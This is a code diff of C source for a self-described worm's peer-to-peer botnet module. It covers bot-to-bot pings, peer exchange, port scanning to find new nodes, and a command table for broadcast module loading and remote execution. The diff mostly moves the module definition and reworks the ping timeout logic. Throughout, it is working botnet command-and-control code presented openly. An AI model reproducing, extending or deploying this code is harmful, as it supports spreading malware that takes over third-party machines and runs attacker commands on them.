@@ -38,8 +38,7 @@ ip generate seed can be used to ensure different bots scan different IPs
 #define BOT_PKT 0xAABBCCDD
 #define MIN_BOT_CONNECTIONS 15
 // timeout after 100 seconds of nothing.. ping/pong at 60
-#define PING_ASK 60
-#define PING_TIMEOUT 100
+#define PING_TIMEOUT 60
 // how many old hashes to store for broadcasts?
 // will start at 64.. 16-20 is prob max ever required for millions
 #define MAX_HASH_COUNT 64
@@ -49,6 +48,38 @@ ip generate seed can be used to ensure different bots scan different IPs
 #define PEER_REQ_COUNT 15
 
 uint32_t security_token = 0;
+
+
+
+// for port scanning.. we only care about nodes (starting new connections)
+// and the main loop
+ModuleFuncs botlink_funcs = {
+    &botlink_read,
+    &botlink_write,
+    &botlink_incoming,
+    NULL, //&botlink_outgoing,
+    &botlink_main_loop,
+    &botlink_connect,
+    NULL //&botlink_disconnect,
+};
+
+Modules HACK_botlink = {
+    // required ( NULL, NULL, 0 )
+    NULL, NULL, 0,
+    // port, state
+    BOT_PORT, 0,
+    // required 0, 0..  
+    0, 0,
+    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
+    // we will run this every 5 seconds since we are a WORM
+    5,
+    // bitcoin functions
+    &botlink_funcs, NULL,
+    // no magic bytes for portscan
+    NULL, 0
+};
+
+
 
 extern ExternalModules *external_list;
 
@@ -197,35 +228,6 @@ int Broadcast_DupeCheck(Modules *mptr, Connection *cptr, char *msg, int size) {
 }
 
 
-// for port scanning.. we only care about nodes (starting new connections)
-// and the main loop
-ModuleFuncs botlink_funcs = {
-    &botlink_read,
-    &botlink_write,
-    &botlink_incoming,
-    NULL, //&botlink_outgoing,
-    &botlink_main_loop,
-    &botlink_connect,
-    NULL //&botlink_disconnect,
-};
-
-Modules HACK_botlink = {
-    // required ( NULL, NULL, 0 )
-    NULL, NULL, 0,
-    // port, state
-    BOT_PORT, 0,
-    // required 0, 0..  
-    0, 0,
-    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
-    // we will run this every 5 seconds since we are a WORM
-    5,
-    // bitcoin functions
-    &botlink_funcs, NULL,
-    // no magic bytes for portscan
-    NULL, 0
-};
-
-
 // botlink desperate
 // if we desperately need to attempt to connect to nodes.. we can port scan
 int botlink_desperate() {
@@ -271,11 +273,11 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
     
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
         i = (cur_ts - cptr->ping_ts);
-        if (i > PING_TIMEOUT) {
+        if (i > (PING_TIMEOUT*150/100)) {
             ConnectionBad(cptr);
             continue;
         }
-        if (i > PING_ASK) {
+        if (i > PING_TIMEOUT) {
             // send a ping message
             botlink_pingpong(mptr, cptr, 0);
         }
@@ -689,7 +691,8 @@ int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size)
         return -1;
     }
     
-    if ((time(0) - vars->req_peer_ts) < PEER_REQ_MIN_TS) return -1;
+    if ((time(0) - vars->req_peer_ts) < PEER_REQ_MIN_TS)
+        return -1;
     
     // find random peers to give to this user 
     // later we need to sort out important peers.. and give only the newest and maybe somme other
@@ -746,14 +749,12 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
     } BotCommands[] = {
         { BOT_CMD_PING, &botlink_cmd_ping, 0, false, false },
         { BOT_CMD_PONG, NULL, 0, false, false },
-        
         // broadcast commands get verified before distribution
         { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, 0, true, false },
         { BOT_CMD_REPORT_IP, &botlink_cmd_report_ip, sizeof(uint32_t), false, false },
         { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, 0, true, false },
         { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, 0, true, false },
         { BOT_CMD_EXECUTE, &botlink_cmd_execute, 0, true, true },
-        
         { BOT_CMD_WANT_PEERS, &botlink_cmd_want_peers, 0, false, false },
         { BOT_CMD_PEER_INFO, &botlink_cmd_peer_info, sizeof(PeerInfo), false, false },
         //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
@@ -802,6 +803,7 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
                 
             // ts we can deal with timeouts.. (and ping/pong)
             cptr->ping_ts = time(0);
+            
             // if the cmd matches, and no function.. or function... we break PONG has no function and is ok
             break;
         }
